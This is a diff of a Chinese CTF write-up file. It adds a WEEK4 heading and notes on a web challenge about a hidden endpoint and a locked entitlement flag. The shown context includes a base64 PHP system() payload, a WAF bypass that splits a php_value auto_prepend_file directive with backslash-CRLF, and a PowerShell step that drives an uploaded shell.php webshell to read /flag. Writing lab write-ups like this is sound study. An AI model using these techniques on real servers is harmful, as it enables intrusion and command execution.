@@ -1832,6 +1832,8 @@ PD9lIHN5c3RlbSgnbHMnKTs/Pg==
 
 <font color="red">**一句话总结**：WAF 拦 `php_value auto_prepend_file` 关键词，用反斜杠+CRLF 把两个关键词都拆开，WAF 看不到完整词就放行，Apache 解析时拼回完整指令生效。</font>
 
+---
+# WEEK4
 ## ez_phar
 #### 前景概要需要掌握
 ##### 1.# PHP 反序列化 速查笔记
@@ -2176,10 +2178,20 @@ Start-Sleep -Milliseconds 500
 Write-Host "`n=== 检查 shell.php ==="
 try {
     $sh = Invoke-WebRequest -Uri "$base/shell.php" -Method Post -Body "cmd=system('cat /flag');echo END;" -UseBasicParsing -TimeoutSec 10
-    Write-Host "✅ flag 拿到了!"
+    Write-Host "flag 拿到了!"
     Write-Host $sh.Content
 } catch {
-    Write-Host "❌ shell.php 还没好，多跑几次这个脚本"
+    Write-Host " shell.php 还没好，多跑几次这个脚本"
 }
 ```
 ![alt text](image-36.png)
+
+
+## 大蒜哥
+### 1.源码
+`gta6Endpoint`真正发 flag 的接口路径，**app.js 里完全没有**，只有特权脚本里才有`gta6Entitlement`一个声明了却从没被使用的权益名 —— 审计里的 “死代码提示”，告诉你服务端在校验这个字段`["一男一女","one-man-one-woman",false]`锁定状态的那款游戏，`false` 就是我要绕的那个 `unlocked`
+![alt text](image-38.png)
+![alt text](image-40.png)
+![alt text](image-39.png)
+![alt text](image-41.png)
+![alt text](image-42.png)
